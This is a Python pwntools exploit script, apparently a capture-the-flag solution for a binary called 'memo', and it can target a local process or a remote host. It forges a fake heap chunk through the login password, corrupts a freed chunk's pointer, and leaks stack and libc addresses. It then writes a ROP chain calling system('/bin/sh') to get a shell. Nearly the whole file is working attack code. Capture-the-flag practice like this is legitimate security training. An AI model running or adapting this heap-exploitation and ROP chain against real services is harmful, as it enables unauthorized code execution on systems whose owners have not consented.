#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1

# modify this
elf = ELF('./memo')

if DEBUG:
    io = process('./memo')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def add(idx, length, msg):
    ru('>> ')
    sl('1')
    ru('Index: ')
    sl(str(idx))
    ru('Length: ')
    sl(str(length))
    if length > 0x20:
        ru('memo though')
        sl(msg)
    else:
        ru('Message: ')
        sl(msg)

def login(name, passwd = ''):
    ru('name: ')
    sl(name)
    ru('password? (y/n) ')
    if len(passwd) > 0:
        sl('y')
        ru('Password: ')
        sn(passwd)
    else:
        sl('n')

def change(passwd, newnm, newpwd):
    ru('>> ')
    sl('5')
    ru('Password: ')
    sn(passwd)
    ru(':')
    sn(newnm)
    ru(':')
    sn(newpwd)

def edit(msg):
    ru('>> ')
    sl('2')
    ru('Edit message: ')
    sn(msg)

def delete(idx):
    ru('>> ')
    sl('4')
    ru('Index: ')
    sl(str(idx))

def view(idx):
    ru('>> ')
    sl('3')
    ru('Index: ')
    sl(str(idx))

# define exploit function here
def pwn():
    login('lowkey', '\x00' * 0x18 + '\x31')#important here, to make a fake chunk in passwd

    add(3, 0x20, '11111111')	
    add(2, 0x20, '22222222')

    delete(2)
    delete(3)

    payload = 'a' * 0x28
    payload += p64(0x31) + p64(0x602a50)
    add(3, 1024, payload)

    add(2, 0x20, '55555555')
    add(0, 0x20, p64(0x0000002000000020) + p64(0x0000002000000020) + p64(0x602a60) + p64(0x602a98))

    view(1)
    ru('View Message: ')
    stack_addr = u64(ru('\n\n')[:-2].ljust(8, '\x00'))
    info('stack_addr :' + hex(stack_addr))

    edit(p64(0x0000002000000020)+p64(0x0000000000000020)+p64(0x602a60)+p64(0x601fb0))
    view(1)
    ru('View Message: ')
    libc_addr = u64(ru('\n\n')[:-2].ljust(8, '\x00'))
    info('libc_addr :' + hex(libc_addr))
    
    l = ELF('./libc-64')
    system = libc_addr - l.symbols['__libc_start_main'] + l.symbols['system']
    binsh = libc_addr - l.symbols['__libc_start_main'] + l.search('/bin/sh\x00').next()
    pop_rdi = 0x0000000000401263

    edit(p64(0x0000002000000020)+p64(0x0000000000000020)+p64(stack_addr + 0x18))
    edit(p64(pop_rdi) + p64(binsh) + p64(system))

    io.interactive()
    return

if __name__ == '__main__':
    
    pause()
    pwn()
    
